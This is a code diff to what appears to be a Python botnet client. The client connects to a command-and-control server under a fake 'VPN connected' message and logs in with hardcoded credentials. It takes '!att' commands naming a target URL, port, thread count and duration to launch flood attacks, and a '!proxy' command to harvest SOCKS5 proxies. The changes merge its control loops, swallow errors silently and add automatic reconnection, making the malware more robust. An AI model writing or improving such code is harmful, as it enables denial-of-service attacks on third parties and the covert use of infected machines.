@@ -281,7 +281,7 @@ def main():
         connected = False
         while not connected:
             try:
-                s = socket(AF_INET , SOCK_STREAM)
+                s = socket(AF_INET, SOCK_STREAM)
                 s.connect((ipc2, portc2))
                 print("VPN connected.")
                 connected = True
@@ -297,31 +297,28 @@ def main():
         try:
             while True:
                 data = s.recv(1024)
+                if not data:
+                    print("Disconnected from server.")
+                    break
                 if b"Username" in data:
                     s.send("kediam".encode())
-                    break
-
-            while True:
-                data = s.recv(1024)
-                if b"Password" in data:
+                elif b"Password" in data:
                     s.send("FSOCIETY".encode())
-                    break
-            
-            while True:
-                try:
-                    c2 = s.recv(1024).decode().strip()
-                    if c2.split()[0] == '!att':
-                        method = str(c2.split()[1])
-                        url = str(c2.split()[2])
-                        port = int(c2.split()[3])
-                        threads = int(c2.split()[4])
-                        rpc = int(c2.split()[5])
-                        timme = int(c2.split()[6])
-                        timer = time() + timme
-                    elif c2.split()[0] == '!proxy':
-                        thr(target=socks5geter).start()
-                except:
-                    pass
+                else:
+                    try:
+                        c2 = data.decode().strip()
+                        if c2.split()[0] == '!att':
+                            method = str(c2.split()[1])
+                            url = str(c2.split()[2])
+                            port = int(c2.split()[3])
+                            threads = int(c2.split()[4])
+                            rpc = int(c2.split()[5])
+                            timme = int(c2.split()[6])
+                            timer = time() + timme
+                        elif c2.split()[0] == '!proxy':
+                            thr(target=socks5geter).start()
+                    except:
+                        pass
 
                 try:
                     us = UserAgent()
@@ -1152,12 +1149,14 @@ def main():
                             thr(target=tcp_storm).start()
                 except:
                     pass
-        except Exception as e:
-            print(f"Error during communication: {e}. Reconnecting...")
+        except:
+            pass
         finally:
             if s:
                 try:
                     s.close()
                 except:
                     pass
+            print("Retrying connection in 5 seconds...")
+            sleep(5)
 main()
